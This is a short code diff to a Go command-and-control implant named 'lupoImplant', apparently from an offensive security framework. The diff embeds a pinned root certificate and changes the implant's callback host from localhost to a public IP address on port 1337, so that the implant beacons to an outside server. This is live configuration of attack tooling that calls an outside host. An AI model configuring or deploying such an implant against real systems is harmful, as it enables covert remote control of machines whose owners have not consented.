@@ -35,6 +35,22 @@ type lupoImplant struct {
 var implant *lupoImplant
 
 var rootCert string = `
+-----BEGIN CERTIFICATE-----
+MIICczCCAfqgAwIBAgIUScPcZ10xkqP/oe/eQsEfSBp3udgwCgYIKoZIzj0EAwIw
+YTELMAkGA1UEBhMCVVMxDTALBgNVBAgMBEx1cG8xDTALBgNVBAcMBEx1cG8xDTAL
+BgNVBAoMBEx1cG8xDTALBgNVBAsMBEx1cG8xFjAUBgNVBAMMDTMuMTQxLjE2NS4y
+MjUwHhcNMjUwNzE3MjA1NjQ2WhcNMzUwNzE1MjA1NjQ2WjBhMQswCQYDVQQGEwJV
+UzENMAsGA1UECAwETHVwbzENMAsGA1UEBwwETHVwbzENMAsGA1UECgwETHVwbzEN
+MAsGA1UECwwETHVwbzEWMBQGA1UEAwwNMy4xNDEuMTY1LjIyNTB2MBAGByqGSM49
+AgEGBSuBBAAiA2IABMhXR7a/wYby0EeG+RAV3dmTssWJV39FjFCgJYThbSH/pwxH
+P9Ddb5hc1WtWAgvYKP6bDIHoLRzdk1+Ldy8RhAX4DfjkpHW7JFKXTedj4IzhaT5A
+0AZVfSOAvCvEiQdE56NzMHEwHQYDVR0OBBYEFLuk+uByo8mRfWvZFQvsamnvSY9H
+MB8GA1UdIwQYMBaAFLuk+uByo8mRfWvZFQvsamnvSY9HMA8GA1UdEwEB/wQFMAMB
+Af8wHgYDVR0RBBcwFYINMy4xNDEuMTY1LjIyNYcEA42l4TAKBggqhkjOPQQDAgNn
+ADBkAjByoIL9cPPvPBeS9ARaqFFsw/5jbsQU6vS4Qy5RGBAH/PIYCG76UuQQT+h1
+2BgDkm8CMDdtTdd/50jvp7mwNBZHGViZ/vHsfR8z+FOrLwKpZQ1iKWCzq56LSfMv
+yOkeLtVNJQ==
+-----END CERTIFICATE-----
 `
 
 func main() {
@@ -44,7 +60,7 @@ func main() {
 	implant = &lupoImplant{
 		updateInterval: 1,
 		protocol:       "https://",
-		rhost:          "127.0.0.1",
+		rhost:          "3.141.165.225",
 		rport:          1337,
 		id:             -1,
 		uuid:           "",
